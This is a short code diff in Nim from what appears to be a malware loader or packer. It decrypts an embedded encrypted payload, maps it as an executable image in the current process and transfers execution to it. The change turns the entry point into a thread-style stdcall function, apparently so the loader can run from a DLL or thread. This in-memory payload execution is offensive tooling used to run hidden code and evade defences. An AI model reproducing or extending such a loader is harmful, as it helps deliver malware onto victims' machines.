@@ -273,8 +273,9 @@ proc decryptData(payload: string): seq[byte] =
     return dectext
 
 #@@userInput@@
+proc NimMain() {.cdecl, importc.}
 
-proc main() =
+proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
     var hProcess = GetCurrentProcess()
     var payloadSeq = decryptData(encPayload)
     var lpBuffer: ptr = payloadSeq[0].addr
@@ -298,7 +299,8 @@ proc main() =
         quit(-1)
 
     transferExecution(ntHeaders, pImageBase, hProcess)
+    return 0
 
 when isMainModule:
-    main()
+    discard main(NULL)
 
